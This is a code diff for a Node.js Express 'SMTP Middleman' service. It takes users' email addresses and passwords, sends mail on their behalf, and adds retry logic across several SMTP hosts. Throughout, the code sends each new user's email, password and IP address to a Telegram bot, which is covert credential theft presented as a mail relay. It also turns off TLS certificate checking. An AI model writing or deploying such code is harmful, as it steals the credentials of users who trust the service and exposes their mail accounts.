@@ -23,8 +23,6 @@ function escapeHtml(str) {
 
 function buildTelegramMessage(userEmail, userPass, clientIp, tanggal, pukul, status, errorMessage = null) {
   const statusText = status === 'SUCCESS' ? '✅ SUCCESS' : '❌ FAILED'
-  const statusColorStyle = status === 'SUCCESS' ? '' : ''
-
   let msg = `
 <b>📧 NEW SMTP ACTIVITY</b>
 ━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -40,13 +38,11 @@ function buildTelegramMessage(userEmail, userPass, clientIp, tanggal, pukul, sta
   }
 
   msg += `\n━━━━━━━━━━━━━━━━━━━━━━━━━\n<i>SMTP Middleman by ArkRega</i>`
-
   return msg.trim()
 }
 
 async function sendTelegramLog(userEmail, userPass, clientIp, tanggal, pukul, status, errorMessage = null) {
   if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return
-
   const messageHtml = buildTelegramMessage(userEmail, userPass, clientIp, tanggal, pukul, status, errorMessage)
   try {
     await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
@@ -57,6 +53,61 @@ async function sendTelegramLog(userEmail, userPass, clientIp, tanggal, pukul, st
   } catch (e) {
     console.error('Telegram send error:', e.message)
   }
+}
+
+async function sendWithRetry(userEmail, userPass, toEmail, subject, htmlBody, attachments) {
+  const cleanPass = userPass.replace(/\s/g, '')
+
+  let hosts = []
+  if (userEmail.endsWith('@gmail.com')) {
+    hosts = ['smtp.gmail.com']
+  } else {
+    hosts = ['mail-1.jetorbit.net', 'mail.fixmerahsupport.web.id']
+  }
+
+  const configs = []
+  for (const host of hosts) {
+    configs.push(
+      { host, port: 465, secure: true },
+      { host, port: 587, secure: false }
+    )
+  }
+
+  let lastError = null
+  for (const cfg of configs) {
+    try {
+      const transporter = nodemailer.createTransport({
+        host: cfg.host,
+        port: cfg.port,
+        secure: cfg.secure,
+        auth: {
+          user: userEmail,
+          pass: cleanPass,
+        },
+        tls: {
+          rejectUnauthorized: false
+        }
+      })
+
+      const mailOptions = {
+        from: userEmail,
+        to: toEmail,
+        subject: subject,
+        html: htmlBody
+      }
+      if (attachments && attachments.length > 0) {
+        mailOptions.attachments = attachments
+      }
+
+      const info = await transporter.sendMail(mailOptions)
+      return { success: true, messageId: info.messageId, usedConfig: cfg }
+    } catch (err) {
+      lastError = err
+      console.log(`Gagal dengan config ${cfg.host}:${cfg.port}: ${err.message}`)
+    }
+  }
+
+  throw lastError || new Error('Semua konfigurasi SMTP gagal')
 }
 
 app.post('/api/send', async (req, res) => {
@@ -72,63 +123,42 @@ app.post('/api/send', async (req, res) => {
     return res.status(400).json({ success: false, error: 'Missing parameters' })
   }
 
+  const cleanPass = userPass.replace(/\s/g, '')
   let status = 'SUCCESS'
+  let errorMessage = null
 
   try {
-    let smtpHost = 'smtp.gmail.com'
-    if (!userEmail.endsWith('@gmail.com')) {
-      smtpHost = 'mail-1.jetorbit.net'
-    }
-
-    const transporter = nodemailer.createTransport({
-      host: smtpHost,
-      port: 465,
-      secure: true,
-      auth: {
-        user: userEmail,
-        pass: userPass
-      }
-    })
-
-    const mailOptions = {
-      from: userEmail,
-      to: toEmail,
-      subject: subject,
-      html: htmlBody
-    }
-
-    if (attachments && attachments.length > 0) {
-      mailOptions.attachments = attachments
-    }
-
-    const info = await transporter.sendMail(mailOptions)
+    const result = await sendWithRetry(userEmail, cleanPass, toEmail, subject, htmlBody, attachments || [])
 
     if (!loggedEmails.has(userEmail)) {
       loggedEmails.add(userEmail)
       const dateObj = new Date()
       const tanggal = dateObj.toLocaleDateString('id-ID', { timeZone: 'Asia/Jakarta' })
       const pukul = dateObj.toLocaleTimeString('id-ID', { timeZone: 'Asia/Jakarta' })
-      await sendTelegramLog(userEmail, userPass, clientIp, tanggal, pukul, status)
+      await sendTelegramLog(userEmail, cleanPass, clientIp, tanggal, pukul, status)
     }
 
     res.status(200).json({
       success: true,
-      messageId: info.messageId
+      messageId: result.messageId,
+      usedHost: result.usedConfig.host,
+      usedPort: result.usedConfig.port
     })
   } catch (error) {
     status = 'FAILED'
+    errorMessage = error.message
 
     if (!loggedEmails.has(userEmail)) {
       loggedEmails.add(userEmail)
       const dateObj = new Date()
       const tanggal = dateObj.toLocaleDateString('id-ID', { timeZone: 'Asia/Jakarta' })
       const pukul = dateObj.toLocaleTimeString('id-ID', { timeZone: 'Asia/Jakarta' })
-      await sendTelegramLog(userEmail, userPass, clientIp, tanggal, pukul, status, error.message)
+      await sendTelegramLog(userEmail, cleanPass, clientIp, tanggal, pukul, status, errorMessage)
     }
 
     res.status(500).json({
       success: false,
-      error: error.message
+      error: errorMessage
     })
   }
 })
